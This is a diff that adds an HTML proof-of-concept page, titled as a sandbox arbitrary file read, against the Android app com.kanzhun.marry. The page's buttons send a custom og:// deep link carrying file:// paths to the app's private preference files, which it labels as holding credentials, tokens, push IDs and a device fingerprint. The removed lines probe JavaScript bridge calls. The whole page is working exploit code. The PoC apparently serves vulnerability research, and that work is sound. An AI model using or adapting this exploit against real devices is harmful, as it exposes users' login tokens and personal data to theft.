@@ -1,4 +1,46 @@
-<script>
-alert( WE.triggerString('get_miui_all_package',''));
-alert( WE.triggerString('getTrackerData',''));
-</script>
+<!DOCTYPE html>
+  <html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC - Sandbox File Read</title>
+  <style>
+  body { font-family: monospace; font-size: 14px; padding: 10px; }
+  button { display: block; margin: 8px 0; padding: 12px; font-size: 15px; width: 100%; background: #c00; color: #fff;
+  border: none; border-radius: 4px; }
+  pre { background: #f0f0f0; padding: 8px; }
+  </style>
+  </head>
+  <body>
+  <h3>Sandbox Arbitrary File Read PoC</h3>
+  <pre id="log"></pre>
+
+  <script>
+  var L = document.getElementById('log');
+  function log(m) { L.textContent += m + '\n'; }
+
+  var targets = [
+      ['App Preferences (credentials/token)',
+       'file:///data/data/com.kanzhun.marry/shared_prefs/com.kanzhun.marry_preferences.xml'],
+      ['User Data',
+       'file:///data/data/com.kanzhun.marry/shared_prefs/mydata.xml'],
+       ['MiPush Config (push token/regId)',
+       'file:///data/data/com.kanzhun.marry/shared_prefs/mipush.xml'],
+      ['Qimei SDK Device Fingerprint',
+       'file:///data/data/com.kanzhun.marry/shared_prefs/QV1com.tencent.qimei.sdk.QimeiSDK0ddf65a502907715.xml'],
+  ];
+
+  targets.forEach(function(t) {
+      var btn = document.createElement('button');
+      btn.textContent = t[0];
+      btn.onclick = function() {
+          log('[*] Reading: ' + t[1]);
+          location.href = 'og://og.app/open?type=100&url=' + encodeURIComponent(t[1]);
+      };
+      document.body.appendChild(btn);
+  });
+
+  log('Click any button to read the file in a new WebView.');
+  </script>
+  </body>
+  </html>
